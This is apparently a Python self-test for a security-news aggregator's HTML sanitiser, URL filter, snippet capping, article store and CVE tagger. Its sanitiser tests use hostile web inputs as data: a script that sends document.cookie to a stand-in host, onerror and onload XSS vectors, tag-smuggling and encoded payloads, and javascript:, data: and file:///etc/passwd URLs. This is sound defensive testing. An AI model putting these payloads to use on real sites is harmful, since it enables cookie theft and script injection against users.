"""
Self-test for the sanitiser and the corpus layer.

Runs offline. This is the test that matters most in the repository: it proves
that hostile feed HTML cannot reach a template, because a static site gives
you no protection at all once the payload is baked into the artifact.

    python pipeline/selftest.py
"""

from __future__ import annotations

import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))

import store  # noqa: E402
from sanitize import clean_title, domain_of, safe_url, snippet, strip_html  # noqa: E402

FAILURES: list[str] = []


def check(name: str, got, want) -> None:
    if got != want:
        FAILURES.append(f"{name}\n     got:  {got!r}\n     want: {want!r}")
        print(f"  FAIL  {name}")
    else:
        print(f"  ok    {name}")


# ---------------------------------------------------------------------------
# Sanitiser: hostile input
# ---------------------------------------------------------------------------
print("\nsanitize.strip_html -- hostile feed content")

check("script tag removed",
      strip_html('Breaking: <script>fetch("//evil.tld?c="+document.cookie)</script>news'),
      "Breaking: news")

check("img onerror removed",
      strip_html('<img src=x onerror="alert(1)">Patch Tuesday'),
      "Patch Tuesday")

check("svg onload removed",
      strip_html('<svg/onload=alert(1)>CVE-2026-1234 disclosed'),
      "CVE-2026-1234 disclosed")

check("iframe removed",
      strip_html('<iframe src="//evil.tld"></iframe>Advisory published'),
      "Advisory published")

check("nested/broken tag smuggling",
      strip_html('<scr<script>ipt>alert(1)</scr</script>ipt>Report'),
      "ipt>alert(1)ipt>Report")

check("double-encoded payload does not re-materialise",
      strip_html('&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;Alert'),
      "Alert")

check("triple-encoded payload also collapses",
      strip_html('&amp;amp;lt;img src=x onerror=alert(1)&amp;amp;gt;Bulletin'),
      "Bulletin")

check("style block dropped",
      strip_html('<style>body{display:none}</style>Ransomware group named'),
      "Ransomware group named")

check("entities decoded, whitespace collapsed",
      strip_html("Rock &amp; roll  &mdash;\n\n  the   exploit"),
      "Rock & roll — the exploit"),

check("empty input safe", strip_html(None), "")


# ---------------------------------------------------------------------------
# URL handling
# ---------------------------------------------------------------------------
print("\nsanitize.safe_url -- scheme and tracking discipline")

check("javascript: rejected", safe_url("javascript:alert(1)"), "")
check("data: rejected", safe_url("data:text/html;base64,PHNjcmlwdD4="), "")
check("vbscript: rejected", safe_url("vbscript:msgbox(1)"), "")
check("file: rejected", safe_url("file:///etc/passwd"), "")
check("protocol-relative rejected", safe_url("//evil.tld/x"), "")
check("whitespace-obfuscated scheme rejected",
      safe_url("java\tscript:alert(1)"), "")
check("plain https kept",
      safe_url("https://Example.COM/a/b?x=1"),
      "https://example.com/a/b?x=1")
check("utm params stripped",
      safe_url("https://ex.com/a?utm_source=rss&utm_medium=feed&id=7"),
      "https://ex.com/a?id=7")
check("fbclid stripped",
      safe_url("https://ex.com/a?fbclid=abc"),
      "https://ex.com/a")
check("fragment dropped",
      safe_url("https://ex.com/a#section"),
      "https://ex.com/a")
check("domain_of strips www", domain_of("https://www.ex.com/a"), "ex.com")


# ---------------------------------------------------------------------------
# Snippet capping -- the AP v. Meltwater control
# ---------------------------------------------------------------------------
print("\nsanitize.snippet -- excerpt discipline")

long_lede = " ".join(f"word{i}" for i in range(1, 61))

check("caps at the configured word count",
      snippet(long_lede, 25),
      " ".join(f"word{i}" for i in range(1, 26)) + "…")

check("zero words means headline-and-link only",
      snippet(long_lede, 0), "")

check("short text passes through unchanged",
      snippet("A brief item.", 25), "A brief item.")

check("strips 'appeared first on' cruft",
      snippet("Attackers hit a vendor. The post Attackers hit a vendor "
              "appeared first on Example Security.", 25),
      "Attackers hit a vendor.")

check("strips [...] continuation marker",
      snippet("Researchers found a flaw [...]", 25),
      "Researchers found a flaw")

check("hostile HTML inside a snippet is neutralised",
      snippet('<b onmouseover="steal()">Critical</b> flaw in widget', 25),
      "Critical flaw in widget")

check("title cleaning matches",
      clean_title('<script>x</script>Zero-day in Foo'),
      "Zero-day in Foo")


# ---------------------------------------------------------------------------
# Corpus behaviour
# ---------------------------------------------------------------------------
print("\nstore -- corpus invariants")

with tempfile.TemporaryDirectory() as tmp:
    db = Path(tmp) / "t.db"
    rec = {
        "id": store.article_id("https://ex.com/a"),
        "source_id": "s", "source_name": "S",
        "title": "T", "url": "https://ex.com/a", "domain": "ex.com",
        "snippet": "snip", "author": "", "published_at": "2026-08-24T00:00:00Z",
        "topics": "vuln", "cves": "CVE-2026-1111",
    }
    with store.connect(db) as conn:
        check("first insert reports new", store.upsert_article(conn, rec), True)
        check("second insert reports not-new", store.upsert_article(conn, rec), False)

        # A publisher silently editing a headline must not rewrite our history.
        edited = {**rec, "title": "EDITED", "snippet": "changed"}
        store.upsert_article(conn, edited)
        row = conn.execute("SELECT title, snippet FROM article").fetchone()
        check("stored title is immutable", row["title"], "T")
        check("stored snippet is immutable", row["snippet"], "snip")
        check("no duplicate rows", store.stats(conn)["articles"], 1)

        # Derived columns are the only thing re-tagging may rewrite.
        store.set_tags(conn, rec["id"], "ransomware", "CVE-2026-2222")
        row = conn.execute("SELECT title, topics, cves FROM article").fetchone()
        check("set_tags updates topics", row["topics"], "ransomware")
        check("set_tags updates cves", row["cves"], "CVE-2026-2222")
        check("set_tags leaves title alone", row["title"], "T")

        store.log_fetch(conn, "s", "ok", seen=3, new=1)
        health = store.source_health(conn)
        check("fetch log records status", health[0]["last_status"], "ok")


# ---------------------------------------------------------------------------
# Enrichment
# ---------------------------------------------------------------------------
print("\nenrich -- topics and CVE extraction")

from enrich import classify, extract_cves  # noqa: E402

check("extracts a CVE from a headline",
      extract_cves("Fortinet fixes CVE-2026-2117 today"), ["CVE-2026-2117"])
check("normalises spacing and case",
      extract_cves("cve 2026 3094 disclosed"), ["CVE-2026-3094"])
check("de-duplicates across fields",
      extract_cves("CVE-2026-1 CVE-2026-1234", "CVE-2026-1234"), ["CVE-2026-1234"])
check("rejects too-few sequence digits", extract_cves("CVE-1234-5"), [])
check("rejects an implausible year", extract_cves("CVE-3050-1234"), [])
check("ignores a bare year-number pair", extract_cves("call 1999-0001"), [])

check("tags a ransomware story",
      "ransomware" in classify("Ransomware crew claims breach of hospital network",
                               "Leak site lists the victim"), True)
check("tags a supply-chain story (plural noun)",
      "supplychain" in classify("Malicious npm packages steal CI secrets", ""), True)
check("tags a vulnerability story",
      "vuln" in classify("Fortinet patches authentication bypass CVE-2026-2117", ""), True)
check("leaves an unrelated story untagged",
      classify("Company announces new office in Dublin",
               "A routine corporate expansion"), [])
check("one weak keyword is not enough",
      classify("Our cloud journey continues", ""), [])
check("caps tags per story",
      len(classify("Ransomware gang exploits zero-day CVE-2026-1234 to breach "
                   "cloud tenants with a new backdoor loader after phishing staff",
                   "")) <= 3, True)

print()
if FAILURES:
    print(f"{len(FAILURES)} FAILURE(S):\n")
    for f in FAILURES:
        print(f"  - {f}\n")
    raise SystemExit(1)

print("All checks passed.")
